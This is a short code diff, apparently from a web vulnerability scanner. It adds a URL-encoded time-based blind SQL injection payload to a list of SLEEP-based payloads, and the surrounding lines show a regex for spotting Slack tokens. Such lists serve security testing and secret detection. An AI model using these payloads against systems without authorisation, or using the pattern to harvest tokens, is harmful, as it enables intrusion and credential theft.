@@ -46,6 +46,7 @@ SQL_INJECTION_BLIND_BASE=[
 "%20SLEEP({})",
 '%20or%20SLEEP({})',
 '''"or%20SLEEP({})%20or%20"*/''',
+ '%2b(select*from(select(sleep({})))a)%2b'
 ]
 REGEX_URL = {
 "slack_token": "(xox[p|b|o|a]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32})",
